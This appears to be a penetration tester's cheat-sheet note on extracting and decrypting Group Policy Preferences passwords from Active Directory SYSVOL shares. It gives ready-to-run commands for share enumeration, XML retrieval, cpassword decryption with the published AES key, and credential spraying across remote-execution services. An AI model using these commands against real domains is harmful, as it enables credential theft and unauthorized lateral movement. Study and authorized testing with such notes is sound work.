---
tags:
  - Active_Directory
  - Credential_Access
  - Discovery
  - Enumeration
  - Foundational
  - Password_Attack
  - Windows
---

## GPP Passwords (Group Policy Preferences)
resources: [HackTricks GPP](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/group-policy-preferences-gpp-pentest), [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt), [AuthFinder GitHub](https://github.com/Real-Fruit-Snacks/authFinder)

> [!info] Group Policy Preferences allowed admins to set local passwords via XML files stored in SYSVOL. The password is AES-encrypted but Microsoft published the key (MS14-025). Any domain user can read SYSVOL.

> [!tip] **What you're looking for:**
> - `Groups.xml` - Local user/group passwords
> - `Services.xml` - Service account passwords
> - `Scheduledtasks.xml` - Scheduled task credentials
> - `Datasources.xml` - Database connection strings
> - `Printers.xml` - Printer configuration passwords
> - `Drives.xml` - Mapped drive credentials

### Check SYSVOL Access [Local]
```bash
smbclient -L //<DC_IP> -N
```

```bash
smbclient //<DC_IP>/SYSVOL -N
```

### Search for GPP Files with NetExec [Local]
```bash
nxc smb <DC_IP> -u <Username> -p '<Password>' -M gpp_password
```

### [Alternate] Search for GPP Files with SMBMap [Local]
```bash
smbmap -H <DC_IP> -u <Username> -p '<Password>' -r "SYSVOL/<Domain>/Policies" --depth 10
```

### [Alternate] Manual Search via SMBClient [Local]
```bash
smbclient //<DC_IP>/SYSVOL -U '<Domain>/<Username>%<Password>' -c 'recurse;ls'
```

### [Alternate] Mount and Search [Local]
```bash
sudo mount -t cifs //<DC_IP>/SYSVOL /mnt/sysvol -o user=<Username>,password=<Password>
```

```bash
find /mnt/sysvol -name "*.xml" -exec grep -l "cpassword" {} \;
```

### Download GPP XML File [Local]
```bash
smbclient //<DC_IP>/SYSVOL -U '<Domain>/<Username>%<Password>' -c 'get <Domain>/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml'
```

### Decrypt cpassword with gpp-decrypt [Local]
> [!info] Extract the **cpassword** value from the XML file first.

```bash
gpp-decrypt '<cpassword_value>'
```

### [Alternate] Decrypt with Python [Local]
```python
python3 -c "import base64; from Crypto.Cipher import AES; key=b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'; iv=b'\x00'*16; print(AES.new(key,AES.MODE_CBC,iv).decrypt(base64.b64decode('<cpassword>')).decode())"
```

### [Alternate] Impacket Get-GPPPassword [Local]
```bash
Get-GPPPassword.py <Domain>/<Username>:<Password>@<DC_IP>
```

### Validate Cracked Credentials [Local]
```bash
nxc smb <DC_IP> -u <GPPUsername> -p '<GPPPassword>' -d <Domain>
```

### [Alternate] Validate with AuthFinder [Local]
> [!tip] Automatically tries WinRM, PSExec, SMBExec, WMI, RDP, MSSQL until one succeeds.

```bash
python -m authFinder -t <TargetIP> -u <GPPUsername> -p '<GPPPassword>' -d <Domain>
```

```bash
# Check across multiple targets
python -m authFinder -t targets.txt -u <GPPUsername> -p '<GPPPassword>' -d <Domain>
```
